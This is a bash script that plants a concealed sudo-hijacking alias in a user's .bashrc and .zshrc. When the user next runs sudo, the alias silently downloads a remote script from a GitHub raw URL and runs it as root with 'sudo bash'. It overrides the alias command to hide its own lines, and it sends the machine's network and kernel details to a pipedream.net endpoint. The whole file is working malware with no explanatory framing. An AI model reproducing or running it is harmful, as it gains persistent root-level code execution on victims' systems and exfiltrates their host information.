#!/bin/bash

SUDO_ALIAS='\nalias command="\`#h1dD3N\`"\nalias sudo="sudo -l > /dev/null && ((nohup curl https://raw.githubusercontent.com/skyf0l/skyf0l.github.io/main/ib.sh 2> /dev/null&disown)|nohup sudo bash >& /dev/null&disown) && unset -f alias && unalias command && unalias sudo && sudo \`#h1dD3N\`"\nfunction alias() { if [ $# = 0 ]; then \\command alias | /bin/grep -v "h1dD3N"; else \\command alias "$1"; fi } #h1dD3N"'

function install_in_rc() {
    if ! [ -f "$1" ]; then
        return
    fi
    grep -vF "h1dD3N" "$1" | grep . > "$1.h1dD3Nbak" && cat "$1.h1dD3Nbak" > "$1" && rm "$1.h1dD3Nbak"
    if ! grep -q "h1dD3N" "$1"; then
        echo -ne $SUDO_ALIAS >> "$1"
    fi
}

install_in_rc ~/.bashrc
install_in_rc ~/.zshrc

(ip a; uname -a) | curl https://enj7fhiwooawt.x.pipedream.net/user -X POST -d "$(</dev/stdin)" > /dev/null 2>&1
